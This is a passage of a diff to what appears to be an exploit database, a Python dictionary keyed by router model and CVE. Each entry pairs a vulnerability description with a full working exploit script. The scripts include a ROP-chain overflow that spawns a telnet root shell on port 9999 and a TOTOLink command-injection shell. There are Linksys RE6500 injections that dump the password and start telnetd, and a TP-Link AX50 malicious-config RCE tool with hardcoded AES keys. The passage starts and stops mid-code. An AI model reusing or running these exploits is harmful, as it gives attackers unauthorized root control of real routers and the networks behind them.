7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F\'\nexpayload = \'\'\npayload = payload.replace(\'z3Bz\',\'\\xff\\xff\\x1b\\x40\') # Need to Existed Address\npayload = payload.replace(\' AAA \',\'\\xf0\\x30\\x02\\x00\') #change eip\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nbssBase = 0x9E150   #string bss BASE Address\nexpayload += \'a\' * 4550\nexpayload += p32(bssBase+3) # R4 Register\nexpayload += p32(0x3F340) # R5 Register //tel\nexpayload += \'IIII\' # R6 Register\nexpayload += \'HHHH\' # R7 Register\nexpayload += \'GGGG\' # R8 Register\nexpayload += \'FFFF\' # R9 Register\nexpayload += p32(bssBase) # R10 Register\nexpayload += \'BBBB\' # R11 Register\nexpayload += p32(0x13644) # strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+6) #R4\nexpayload += p32(0x423D7) #R5  //telnet\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+8) #R4\nexpayload += p32(0x40CA4 ) #R5  //telnetd\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+10) #R4\nexpayload += p32(0x4704A) #R5  //telnetd\\x20-l\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+11) #R4\nexpayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+16) #R4\nexpayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+18) #R4\nexpayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+22) #R4\nexpayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+24) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+26) #R4\nexpayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+28) #R4\nexpayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase+30) #R4\nexpayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x13648) #strcpy\nprint "[*] Make Payload ..."\nexpayload += \'d\'*0x5c#dummy\nexpayload += p32(bssBase) #R4\nexpayload += p32(0x47398) #R5\nexpayload += \'c\'*4 #R6\nexpayload += \'c\'*4 #R7\nexpayload += \'c\'*4 #R8\nexpayload += \'d\'*4 #R10\nexpayload += p32(0x1A83C) #system(string) telnetd -l\ns.connect((\'239.255.255.250\', 1900))\nprint "[*] Send Proof Of Concept payload"\ns.send(\'a\\x00\'+expayload)#expayload is rop gadget\ns.send(payload)\ndef checkExploit():\nsoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\n    ret = soc.connect((\'192.168.1.1\',9999))\n    return 1\nexcept:\n    return 0\ntime.sleep(5)\nif checkExploit():\n    print("[*] Exploit Success")\n    print("[*] You can access telnet 192.168.1.1 9999")\nelse:\n    print("[*] Need to Existed Address cross each other")\n    print("[*] You need to reboot or execute upnpd daemon to execute upnpd")\n    print("[*] To exploit reexecute upnpd, description")\n    print("[*] Access http://192.168.1.1/debug.htm and enable telnet")\n    print("[*] then, You can access telnet. execute upnpd(just typing upnpd)")\ns.close()\nprint(Done)\n        ']
 }
 
 model_exp_dic["H3C_magic_R100"] = {
@@ -582,7 +653,7 @@ model_exp_dic["TOTOLINK_A950RG"] = {
 
 model_exp_dic["TOTOLINK_T10"] = {
     "CVE-2022-25081":
-['TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/T10/README.md\']', '\nimport requests\n\nwhile(1):\n    print \'$\',\n    a = \'aabb;\' + raw_input().replace(\' \',\'$IFS$1\') + \';\'\n    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)\n    print response.text.replace("QUERY_STRING:aabb",\'\')\n']
+['TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/T10/README.md\']', '\nimport requests\n\nwhile(1):\n    print(\'$\',)\n    a = \'aabb;\' + raw_input().replace(\' \',\'$IFS$1\') + \';\'\n    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)\n    print(response.text.replace("QUERY_STRING:aabb",\'\'))\n']
 }
 
 model_exp_dic["TOTOLINK_A860R"] = {
@@ -595,12 +666,12 @@ model_exp_dic["Linsys_RE6500"] = {
     "CVE-2020-35714":
 ["Belkin LINKSYS RE6500 devices before 1.0.11.001 allow remote authenticated users to execute arbitrary commands via goform/systemCommand?command= in conjunction with the goform/pingstart program.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.05 - Authenticated command injection Ping page\n\nfrom requests import Session\nimport requests\nimport os\nip="192.168.1.226"\nurl_codeinjection="http://"+ip+"/goform/systemCommand?pingTestIP=www.google.com&ping_size=32&ping_times=5&command=busybox+telnetd&+"\n\nrequestedbody_login="password=0000074200016071000071120003627500015159"\n\ns = requests.Session()\n\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\ns.post("http://"+ip+"/goform/webLogin",data=requestedbody_login)\n\ns.headers.update({\'Referer\': "http://"+ip+"/admin/diagnostics.shtml"})\n\ns.get(url_codeinjection)\n\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/admin/startping.shtml"})\n\ns.post("http://"+ip+"/goform/pingstart", data="")\n'],
     "CVE-2020-35713":
-["Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE\n#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. \n#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. \n\n# Exploit Author: RE-Solver - https://twitter.com/solver_re\n# Vendor Homepage: www.linksys.com\n# Version: FW V1.05 up to FW v1.0.11.001\n\nfrom requests import Session\nimport requests\nimport os\nprint("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")\nprint("Tested on FW V1.05 up to FW v1.0.11.001")\nprint("RE-Solver @solver_re")\nip="192.168.1.226"\n\ncommand="nvram_get Password >/tmp/lastpwd"\n#save device password;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr= s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prev password saved in /tmp/lastpwd")\n\ncommand="busybox telnetd"\n#start telnetd;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Telnet Enabled")\n\n#set admin password\npost_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prevent corrupting nvram - set a new password= admin"\n']
+["Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE\n#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. \n#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. \n\n# Exploit Author: RE-Solver - https://twitter.com/solver_re\n# Vendor Homepage: www.linksys.com\n# Version: FW V1.05 up to FW v1.0.11.001\n\nfrom requests import Session\nimport requests\nimport os\nprint("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")\nprint("Tested on FW V1.05 up to FW v1.0.11.001")\nprint("RE-Solver @solver_re")\nip="192.168.1.226"\n\ncommand="nvram_get Password >/tmp/lastpwd"\n#save device password;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr= s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prev password saved in /tmp/lastpwd")\n\ncommand="busybox telnetd"\n#start telnetd;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Telnet Enabled")\n\n#set admin password\npost_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prevent corrupting nvram - set a new password= admin")\n']
 }
 
 model_exp_dic["TP_Archer_AX50"] = {
     "CVE-2022-30075":
-["In TP-Link Router AX50 firmware 210730 and older, import of a malicious backup file via web interface can lead to remote code execution due to improper validation.\n['http://packetstormsecurity.com/files/167522/TP-Link-AX50-Remote-Code-Execution.html', 'http://tp-link.com', 'https://github.com/aaronsvk', 'https://github.com/aaronsvk/CVE-2022-30075', 'https://www.exploit-db.com/exploits/50962']", '\n#!/usr/bin/python3\n# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution\n# Exploit Author: Tomas Melicher\n# Technical Details: https://github.com/aaronsvk/CVE-2022-30075\n# Date: 2022-06-08\n# Vendor Homepage: https://www.tp-link.com/\n# Tested On: Tp-Link Archer AX50\n# Vulnerability Description:\n#   Remote Code Execution via importing malicious config file\n\nimport argparse # pip install argparse\nimport requests # pip install requests\nimport binascii, base64, os, re, json, sys, time, math, random, hashlib\nimport tarfile, zlib\nfrom Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom urllib.parse import urlencode\n\nclass WebClient(object):\n\n\tdef __init__(self, target, password):\n\t\tself.target = target\n\t\tself.password = password.encode(\'utf-8\')\n\t\tself.password_hash = hashlib.md5((\'admin%s\'%password).encode(\'utf-8\')).hexdigest().encode(\'utf-8\')\n\t\tself.aes_key = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\t\tself.aes_iv = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\n\t\tself.stok = \'\'\n\t\tself.session = requests.Session()\n\n\t\tdata = self.basic_request(\'/login?form=auth\', {\'operation\':\'read\'})\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] unsupported router\')\n\t\t\treturn\n\t\tself.sign_rsa_n = int(data[\'data\'][\'key\'][0], 16)\n\t\tself.sign_rsa_e = int(data[\'data\'][\'key\'][1], 16)\n\t\tself.seq = data[\'data\'][\'seq\']\n\n\t\tdata = self.basic_request(\'/login?form=keys\', {\'operation\':\'read\'})\n\t\tself.password_rsa_n = int(data[\'data\'][\'password\'][0], 16)\n\t\tself.password_rsa_e = int(data[\'data\'][\'password\'][1], 16)\n\n\t\tself.stok = self.login()\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef rsa_encrypt(self, n, e, plaintext):\n\t\tpublic_key = RSA.construct((n, e)).publickey()\n\t\tencryptor = PKCS1_v1_5.new(public_key)\n\t\tblock_size = int(public_key.n.bit_length()/8) - 11\n\t\tencrypted_text = \'\'\n\t\tfor i in range(0, len(plaintext), block_size):\n\t\t\tencrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()\n\t\treturn encrypted_text\n\n\n\tdef download_request(self, url, post_data):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, stream=True)\n\t\tfilepath = os.getcwd()+\'/\'+re.findall(r\'(?<=filename=")[^"]+\', res.headers[\'Content-Disposition\'])[0]\n\t\tif os.path.exists(filepath):\n\t\t\tprint(\'[!] can\'t download, file "%s" already exists\' % filepath)\n\t\t\treturn\n\t\twith open(filepath, \'wb\') as f:\n\t\t\tfor chunk in res.iter_content(chunk_size=4096):\n\t\t\t\tf.write(chunk)\n\t\treturn filepath\n\n\n\tdef basic_request(self, url, post_data, files_data={}):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, files=files_data)\n\t\treturn json.loads(res.content)\n\n\n\tdef encrypted_request(self, url, post_data):\n\t\tserialized_data = urlencode(post_data)\n\t\tencrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode(\'utf-8\'))\n\t\tencrypted_data = base64.b64encode(encrypted_data)\n\n\t\tsignature = (\'k=%s&i=%s&h=%s&s=%d\'.encode(\'utf-8\')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))\n\t\tencrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)\n\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data={\'sign\':encrypted_signature, \'data\':encrypted_data}) # order of params is important\n\t\tif(res.status_code != 200):\n\t\t\tprint(\'[!] url "%s" returned unexpected status code\'%(url))\n\t\t\treturn\n\t\tencrypted_data = json.loads(res.content)\n\t\tencrypted_data = base64.b64decode(encrypted_data[\'data\'])\n\t\tdata = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)\n\t\treturn json.loads(data)\n\n\n\tdef login(self):\n\t\tpost_data = {\'operation\':\'login\', \'password\':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}\n\t\tdata = self.encrypted_request(\'/login?form=login\', post_data)\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] login failed\')\n\t\t\treturn\n\t\tprint(\'[+] logged in, received token (stok): %s\'%(data[\'data\'][\'stok\']))\n\t\treturn data[\'data\'][\'stok\']\n\n\n\nclass BackupParser(object):\n\n\tdef __init__(self, filepath):\n\t\tself.encrypted_path = os.path.abspath(filepath)\n\t\tself.decrypted_path = os.path.splitext(filepath)[0]\n\n\t\tself.aes_key = bytes.fromhex(\'2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\t\tself.iv = bytes.fromhex(\'360028C9064242F81074F4C127D299F6\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef encrypt_config(self):\n\t\tif not os.path.isdir(self.decrypted_path):\n\t\t\tprint(\'[!] invalid directory "%s"\'%(self.decrypted_path))\n\t\t\treturn\n\n\t\t# encrypt, compress each .xml using zlib and add them to tar archive\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'w\') as tar:\n\t\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\t\tif ext == \'.xml\':\n\t\t\t\t\txml_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\t\tbin_path = \'%s/%s.bin\'%(self.decrypted_path,basename)\n\t\t\t\t\twith open(xml_path, \'rb\') as f:\n\t\t\t\t\t\tplaintext = f.read()\n\t\t\t\t\tif len(plaintext) == 0:\n\t\t\t\t\t\tf = open(bin_path, \'w\')\n\t\t\t\t\t\tf.close()\n\t\t\t\t\telse:\n\t\t\t\t\t\tcompressed = zlib.compress(plaintext)\n\t\t\t\t\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t\t\t\t\twith open(bin_path, \'wb\') as f:\n\t\t\t\t\t\t\tf.write(encrypted)\n\t\t\t\t\ttar.add(bin_path, os.path.basename(bin_path))\n\t\t\t\t\tos.unlink(bin_path)\n\t\t# compress tar archive using zlib and encrypt\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'rb\') as f1, open(\'%s/data.tar\'%(self.decrypted_path), \'rb\') as f2:\n\t\t\tcompressed = 